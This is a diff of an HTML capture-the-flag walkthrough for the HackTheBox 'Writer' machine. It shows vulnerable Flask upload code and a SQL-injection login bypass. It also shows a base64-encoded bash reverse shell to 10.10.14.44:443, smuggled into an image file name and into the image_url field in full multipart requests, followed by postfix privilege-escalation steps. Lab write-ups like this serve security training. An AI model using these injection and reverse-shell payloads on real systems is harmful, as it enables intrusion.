+</span></span><span style="display:flex;"><span>                        im<span style="color:#ff79c6">.</span>verify()
+</span></span><span style="display:flex;"><span>                        im<span style="color:#ff79c6">.</span>close()
+</span></span><span style="display:flex;"><span>                        image <span style="color:#ff79c6">=</span> image<span style="color:#ff79c6">.</span>replace(<span style="color:#f1fa8c">&#39;/tmp/&#39;</span>,<span style="color:#f1fa8c">&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>                        os<span style="color:#ff79c6">.</span>system(<span style="color:#f1fa8c">&#34;mv /tmp/</span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c"> /var/www/writer.htb/writer/static/img/</span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">.</span>format(image, image))
+</span></span><span style="display:flex;"><span>                        image <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;/img/</span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">.</span>format(image)
+</span></span><span style="display:flex;"><span>                        cursor <span style="color:#ff79c6">=</span> connector<span style="color:#ff79c6">.</span>cursor()
+</span></span><span style="display:flex;"><span>                        cursor<span style="color:#ff79c6">.</span>execute(<span style="color:#f1fa8c">&#34;UPDATE stories SET image = </span><span style="color:#f1fa8c">%(image)s</span><span style="color:#f1fa8c"> WHERE id = </span><span style="color:#f1fa8c">%(id)s</span><span style="color:#f1fa8c">&#34;</span>, {<span style="color:#f1fa8c">&#39;image&#39;</span>:image, <span style="color:#f1fa8c">&#39;id&#39;</span>:<span style="color:#8be9fd;font-style:italic">id</span>})
+</span></span><span style="display:flex;"><span>                        result <span style="color:#ff79c6">=</span> connector<span style="color:#ff79c6">.</span>commit()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">except</span> PIL<span style="color:#ff79c6">.</span>UnidentifiedImageError:
+</span></span><span style="display:flex;"><span>                        os<span style="color:#ff79c6">.</span>system(<span style="color:#f1fa8c">&#34;rm </span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">.</span>format(image))
+</span></span><span style="display:flex;"><span>                        error <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;Not a valid image file!&#34;</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#ff79c6">return</span> render_template(<span style="color:#f1fa8c">&#39;edit.html&#39;</span>, error<span style="color:#ff79c6">=</span>error, results<span style="color:#ff79c6">=</span>results, <span style="color:#8be9fd;font-style:italic">id</span><span style="color:#ff79c6">=</span><span style="color:#8be9fd;font-style:italic">id</span>)
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">except</span>:
+</span></span><span style="display:flex;"><span>                    error <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;Issue uploading picture&#34;</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">return</span> render_template(<span style="color:#f1fa8c">&#39;edit.html&#39;</span>, error<span style="color:#ff79c6">=</span>error, results<span style="color:#ff79c6">=</span>results, <span style="color:#8be9fd;font-style:italic">id</span><span style="color:#ff79c6">=</span><span style="color:#8be9fd;font-style:italic">id</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">else</span>:
+</span></span><span style="display:flex;"><span>                error <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;File extensions must be in .jpg!&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">return</span> render_template(<span style="color:#f1fa8c">&#39;edit.html&#39;</span>, error<span style="color:#ff79c6">=</span>error, results<span style="color:#ff79c6">=</span>results, <span style="color:#8be9fd;font-style:italic">id</span><span style="color:#ff79c6">=</span><span style="color:#8be9fd;font-style:italic">id</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    [<span style="color:#ff79c6">..</span>snip<span style="color:#ff79c6">..</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> __name__ <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>   app<span style="color:#ff79c6">.</span>run(<span style="color:#f1fa8c">&#34;0.0.0.0&#34;</span>)
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>There is a first vulnerabiity on row 28-29 : we can post an image with <code>request.files['image']</code> and it will be saved in <strong>/static/img</strong> as long as it contains <code>.jpg</code> in its name (it does not have to be the extension).</p>
 <pre><code>        if &quot;.jpg&quot; in image.filename:
@@ -633,49 +633,49 @@ app <span style="color:#ff79c6">=</span> Flask(__name__,static_url_path<span sty
 <tr>
 <td>Second POST</td>
 <td>image_url</td>
-<td><code>file:///var/www/writer.htb/writer/static/img/somefile.jpg; COMMAND TO BE INJECTED;</code>'</td>
+<td><code>file:///var/www/writer.htb/writer/static/img/somefile.jpg; COMMAND TO BE INJECTED;</code>&rsquo;</td>
 <td>The injected command is executed</td>
 </tr>
 </tbody>
 </table>
 <p>Before going for this exploit, we can play with fuzzing for more files with this request:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http">cat &gt; ffuf.txt &lt;&lt; EOF
-<span style="color:#50fa7b">POST</span> /administrative <span style="color:#ff79c6">HTTP</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">1.1</span>
-Host<span style="color:#ff79c6">:</span> writer.htb
-User-Agent<span style="color:#ff79c6">:</span> Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
-Accept<span style="color:#ff79c6">:</span> text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
-Accept-Language<span style="color:#ff79c6">:</span> en-US,en;q=0.5
-Accept-Encoding<span style="color:#ff79c6">:</span> gzip, deflate
-Content-Type<span style="color:#ff79c6">:</span> application/x-www-form-urlencoded
-Content-Length<span style="color:#ff79c6">:</span> 94
-Origin<span style="color:#ff79c6">:</span> http://writer.htb
-Connection<span style="color:#ff79c6">:</span> close
-Referer<span style="color:#ff79c6">:</span> http://writer.htb/administrative
-Upgrade-Insecure-Requests<span style="color:#ff79c6">:</span> 1
-
-uname=&#39;+UNION+ALL+SELECT+1,LOAD_FILE(&#39;FUFF&#39;),3,4,5,6%3b--+-&amp;password=test
-EOF
-</code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span>cat &gt; ffuf.txt &lt;&lt; EOF
+</span></span><span style="display:flex;"><span><span style="color:#50fa7b">POST</span> /administrative <span style="color:#ff79c6">HTTP</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#ff79c6">:</span> writer.htb
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#ff79c6">:</span> Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+</span></span><span style="display:flex;"><span>Accept<span style="color:#ff79c6">:</span> text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#ff79c6">:</span> en-US,en;q=0.5
+</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#ff79c6">:</span> gzip, deflate
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#ff79c6">:</span> application/x-www-form-urlencoded
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#ff79c6">:</span> 94
+</span></span><span style="display:flex;"><span>Origin<span style="color:#ff79c6">:</span> http://writer.htb
+</span></span><span style="display:flex;"><span>Connection<span style="color:#ff79c6">:</span> close
+</span></span><span style="display:flex;"><span>Referer<span style="color:#ff79c6">:</span> http://writer.htb/administrative
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#ff79c6">:</span> 1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>uname=&#39;+UNION+ALL+SELECT+1,LOAD_FILE(&#39;FUFF&#39;),3,4,5,6%3b--+-&amp;password=test
+</span></span><span style="display:flex;"><span>EOF
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>FFUF works very well and super fast, but there is too many files to look at, including binaries.</p>
 <pre><code>ffuf -X POST -request ~/htb/writer/ffuf.txt \
@@ -686,17 +686,17 @@ EOF
 <h3 id="weaponization---exploit-payload">Weaponization - Exploit Payload</h3>
 <p>Once we have pass the login form with the SQL injection, we have access to the dashboard and the admin interface. We are allowed to publish an image to Stories, so we can attempt to upload instead an exploit. First we upload a real image, then we upload an exploit instead of the images.</p>
 <p>Exploit:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#8be9fd;font-style:italic">echo</span> -n <span style="color:#f1fa8c">&#39;/bin/bash -c &#34;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.44/443 0&gt;&amp;1&#34;&#39;</span> | base64
-L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNDQvNDQzIDA+JjEi
-touch <span style="color:#f1fa8c">&#39;AAAA.jpg;`echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNDQvNDQzIDA+JjEi | base64 -d | bash `;&#39;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">echo</span> -n <span style="color:#f1fa8c">&#39;/bin/bash -c &#34;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.44/443 0&gt;&amp;1&#34;&#39;</span> | base64
+</span></span><span style="display:flex;"><span>L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNDQvNDQzIDA+JjEi
+</span></span><span style="display:flex;"><span>touch <span style="color:#f1fa8c">&#39;AAAA.jpg;`echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNDQvNDQzIDA+JjEi | base64 -d | bash `;&#39;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>We can compare in Burp Comparer the requests for the real image uploaded vs. the exploit</p>
 <table>
@@ -734,26 +734,26 @@ Cookie: session=eyJ1c2VyIjoib29wcycgVU5JT04gQUxMIFNFTEVDVCAwLExPQURfRklMRSgnL2V0
 Upgrade-Insecure-Requests: 1
 
 -----------------------------4229921975180160461559477084
-Content-Disposition: form-data; name=&quot;author&quot;
+Content-Disposition: form-data; name=&#34;author&#34;
 
 AAAA
 -----------------------------4229921975180160461559477084
-Content-Disposition: form-data; name=&quot;title&quot;
+Content-Disposition: form-data; name=&#34;title&#34;
 
 AAAA
 -----------------------------4229921975180160461559477084
-Content-Disposition: form-data; name=&quot;tagline&quot;
+Content-Disposition: form-data; name=&#34;tagline&#34;
 
 AAAA
 -----------------------------4229921975180160461559477084
-Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;AAAA.jpg;`echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNDQvNDQzIDA+JjEi | base64 -d | bash`&quot;
+Content-Disposition: form-data; name=&#34;image&#34;; filename=&#34;AAAA.jpg;`echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNDQvNDQzIDA+JjEi | base64 -d | bash`&#34;
 Content-Type: image/jpeg
 
 -----------------------------4229921975180160461559477084
-Content-Disposition: form-data; name=&quot;image_url&quot;
+Content-Disposition: form-data; name=&#34;image_url&#34;
 
 -----------------------------4229921975180160461559477084
-Content-Disposition: form-data; name=&quot;content&quot;
+Content-Disposition: form-data; name=&#34;content&#34;
 
 AAAA
 -----------------------------4229921975180160461559477084--
@@ -774,29 +774,29 @@ Cookie: session=eyJ1c2VyIjoib29wcycgVU5JT04gQUxMIFNFTEVDVCAwLExPQURfRklMRSgnL2V0
 Upgrade-Insecure-Requests: 1
 
 -----------------------------4229921975180160461559477084
-Content-Disposition: form-data; name=&quot;author&quot;
+Content-Disposition: form-data; name=&#34;author&#34;
 
 AAAA
 -----------------------------4229921975180160461559477084
-Content-Disposition: form-data; name=&quot;title&quot;
+Content-Disposition: form-data; name=&#34;title&#34;
 
 AAAA
 -----------------------------4229921975180160461559477084
-Content-Disposition: form-data; name=&quot;tagline&quot;
+Content-Disposition: form-data; name=&#34;tagline&#34;
 
 AAAA
 -----------------------------4229921975180160461559477084
-Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;aaa.jpg&quot;
+Content-Disposition: form-data; name=&#34;image&#34;; filename=&#34;aaa.jpg&#34;
 Content-Type: image/jpeg
 
 
 -----------------------------4229921975180160461559477084
-Content-Disposition: form-data; name=&quot;image_url&quot;
+Content-Disposition: form-data; name=&#34;image_url&#34;
 
 file:///var/www/writer.htb/writer/static/img/AAAA.jpg;`echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNDQvNDQzIDA+JjEi | base64 -d | bash`
 
 -----------------------------4229921975180160461559477084
-Content-Disposition: form-data; name=&quot;content&quot;
+Content-Disposition: form-data; name=&#34;content&#34;
 
 AAAA
 -----------------------------4229921975180160461559477084--
@@ -929,102 +929,102 @@ kyle@writer:/dev/shm/.a$ chmod +x pspy64s &amp;&amp; ./pspy64s
 <p>It highlights in yellow the three postfix processes we found earlier and if we are patient, it will show cron jobs as they are executed. Being a member of the group <code>filter</code>, we are authorised to modify the <strong>/etc/postfix/disclaimer</strong> which is used to append a disclaimer at the end of outgoing emails. Looking at the file, we can see it is in fact a bash script:</p>
 <pre><code>kyle@writer:~$ cat /etc/postfix/disclaimer
 </code></pre>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ff79c6">#!/bin/sh
-</span><span style="color:#ff79c6"></span>
-<span style="color:#6272a4"># Localize these.</span>
-<span style="color:#8be9fd;font-style:italic">INSPECT_DIR</span><span style="color:#ff79c6">=</span>/var/spool/filter
-<span style="color:#8be9fd;font-style:italic">SENDMAIL</span><span style="color:#ff79c6">=</span>/usr/sbin/sendmail
-
-<span style="color:#6272a4"># Get disclaimer addresses</span>
-<span style="color:#8be9fd;font-style:italic">DISCLAIMER_ADDRESSES</span><span style="color:#ff79c6">=</span>/etc/postfix/disclaimer_addresses
-
-<span style="color:#6272a4"># Exit codes from &lt;sysexits.h&gt;</span>
-<span style="color:#8be9fd;font-style:italic">EX_TEMPFAIL</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">75</span>
-<span style="color:#8be9fd;font-style:italic">EX_UNAVAILABLE</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">69</span>
-
-<span style="color:#6272a4"># Clean up when done or when aborting.</span>
